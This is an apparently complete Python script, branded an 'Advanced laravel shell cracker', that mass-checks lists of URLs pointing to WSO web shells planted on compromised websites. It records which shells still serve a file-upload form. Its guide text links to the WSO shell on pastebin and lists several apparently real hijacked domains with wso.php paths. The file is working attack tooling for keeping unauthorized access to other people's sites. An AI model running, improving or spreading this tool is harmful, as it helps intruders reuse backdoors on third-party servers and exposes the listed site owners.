import requests, sys, os, re, random, urllib.request, urllib.error, urllib.parse, urllib.request, urllib.parse, urllib.error, http.client, socket, ssl, string, base64, zlib
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from platform import system
from colorama import *
init()
currentVersion = 'V1.3-2'
red = '\x1b[31m'
green = '\x1b[32m'
blue = '\x1b[32m'
yellow = '\x1b[33m'
white = '\x1b[37m'
combo = '''

 /$$$$$$$  /$$ /$$ /$$                                 /$$                        
| $$__  $$|__/| $$| $$                                | $$                        
| $$  \ $$ /$$| $$| $$  /$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$ 
| $$$$$$$ | $$| $$| $$ |____  $$| $$__  $$ |____  $$|_  $$_/   /$$__  $$ /$$__  $$
| $$__  $$| $$| $$| $$  /$$$$$$$| $$  \ $$  /$$$$$$$  | $$    | $$  \ $$| $$  \__/
| $$  \ $$| $$| $$| $$ /$$__  $$| $$  | $$ /$$__  $$  | $$ /$$| $$  | $$| $$      
| $$$$$$$/| $$| $$| $$|  $$$$$$$| $$  | $$|  $$$$$$$  |  $$$$/|  $$$$$$/| $$      
|_______/ |__/|__/|__/ \_______/|__/  |__/ \_______/   \___/   \______/ |__/      
                                                                                  
                                                                                  
Advanced laravel shell cracker


'''
print(blue + combo + white)
choice = 17
try:
    os.mkdir('results')
except:
    pass

def guide():
    gd = '\nRules: must use wso shell this one --> https://pastebin.com/Ds35ij44\n\n\n1. Mass shell to anything uploader! \n\tPut shell list like this\n\t\thttp://toprose24.ru/wp-includes/js/tinymce/wso.php\n\t\thttp://nacso.org/wp-admin/shop/media/wso.php\n\t\thttp://www.systemawindsor.com/2014/wso.php\n\t\thttp://heights.co.kr/wp-includes/js/tinymce/wso.php\n\t\thttp://mybaguse.com/oldsite/wp-includes/wso.php\n\t\thttp://bdsharebazar.info/wp-includes/Core/wso.php\n\t\thttp://www.modsolar.net/wp-content/uploads/wso.php\n\t\thttp://theknittingneedle.in//wp-includes/css/wso.php\n\n\n\n'
    print(yellow + gd + white)


def tool17(url):
    try:
        wcheck = requests.get(url, timeout=5)
        if wcheck.status_code == 200:
            if "type='file'" in wcheck.text or 'type="file' in wcheck.text or 'type=file' in wcheck.text:
                print(green + '[+] ' + url + ' ===> [+] Success!' + white)
                os.chdir('results')
                open('working_shells.txt', 'a').write(url + '\n')
                os.chdir('..')
        else:
            print(red + '[+] ' + url + ' ===> [-] Not working!' + white)
    except:
        pass


if choice == 0:
    guide()
elif choice == 17:
    try:
        listshell = input(yellow + '[?] Enter wso shells list: ' + white)
        try:
            with open(listshell, 'r') as (get):
                read = get.read().splitlines()
        except IOError:
            pass

        read = list(read)
        try:
            pp = ThreadPool(10)
            pr = pp.map(tool17, read)
        except:
            pass

    except:
        pass

